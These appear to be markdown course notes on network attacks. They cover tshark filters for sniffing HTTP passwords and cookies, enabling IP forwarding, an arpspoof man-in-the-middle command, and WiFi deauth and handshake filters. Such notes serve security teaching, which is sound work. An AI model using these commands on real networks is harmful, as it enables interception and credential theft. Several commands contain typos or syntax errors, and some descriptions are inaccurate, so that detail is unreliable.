# Table of Contents

- [Overview](#1)
  - [What is a network based attack?](#1.1)
- [TShark](#2)
- [ARP Spoofing](#3)
- [WiFi Traffic analysis](#4)

<a id=1></a>
# Overview

We'll learn the following attacks:

- ARP poisoning
- MiTM attacks
- Packet analysis

<a id=1.1></a>
## What is a network based attack?

A network based attack is an attack that doesn't direct its attention to a particular operating system, but
rather on network protocols such as ARP, DNS, DHCP and more.

The main attack we will is discuss is Man in the Middle attacks. This kinds of attacks turn the attacker into
kind of like a proxy between two endpoints. In this course we will discuss ARP poisoning style MiTM attacks.

We can also use the promiscuous mode in a traffic capture application like Wireshark or Tshark. This will enable
us to listen to all packets in the network.

<a id=2></a>
# Tshark

```bash
$ tshark -i [INTERFACE] {-Y [PACKET FILTER] -f [CAPTURE FILTER] -w [OUTPUT FILE] -F [PCAP/PCAPNG] --color -r [PCAP/PCAPNG FILE] -z [STATISTIC] -q [PACKET COUNT]}
$ tshart -i eth1 -Y "http" # Only HTTP packets.
$ tshark -i eth1 -Y "http.request.method == GET" # Only show GET HTTP requests
$ tshark -i eth1 -Y "http.request.method == POST" -Tfields -e frame.time -e ip.src -e http.request.full_uri # Show POST requests and 
# show packet time, source IP and full URI
$ tshark -i eth1 -Y "http contains password" # Look for HTTP packets that contain the string 'password'
$ tshark -i eth1 -Y "http.request.method= == GET && http.host = google.com" # Shows only HTTP requests made to Google
$ tshark -i eth1 -Y "http.request.method= == GET && http.host = google.com" -Tfields -e ip.src # Shows only HTTP requests made to Google and IP source.
$ tshark -i eth1 -Y "http.request.method= == GET && http.host = amazon.com" -Tfields -e ip.src -e http.cookie # Shows only HTTP requests made to Amazon with cookies
```

<a id=3></a>
# ARP Poisoning

To do ARP poisoning, first we have to enable the IPv4 forwarding proc on Linux.

```bash
$ echo 1 > /proc/sys/net/ipv4/ip_forward
```

Now we can do some ARP poisoning.

```bash
$ arpspoof -i eth1 -t [SPOOF] -r [TARGET]
```

<a id=4></a>
# WiFi Traffic analysis

Check the video, not much to say :)

```bash
tshark -Y 'wlan' # only shows wlan packets
tshark -Y 'wlan.fc.type_subtype == 0x000c' # only show wlan deauthentication packets
tshark -Y 'wlan.fc.type_subtype == 0x000c' -Tfields -e wlan.ra # only show received deauth packets
tshark -Y 'wlan.ta == [MAC]' # show traffic from [MAC] address
tshark -Y 'eapol' # shows only tcp handshake (cafe latte attack)
tshark -Y 'wlan.fc.type_subtype == 8' -Tfields -e wlan.ssid -e wlan.bssid # show ssid and bssid 
tshark -Y 'wlan.ssid==FreeWifi" -Tfields -e wlan.bssid # Show bssid of specific ssid
tshark -Y 'wlan.ssid==FreeWifi" -Tfields -e wlan_radio.channel # Show on which channel SSID operates on
tshark -Y 'wlan.fixed.cappabilities.privacy == 0 # find open wifi
```
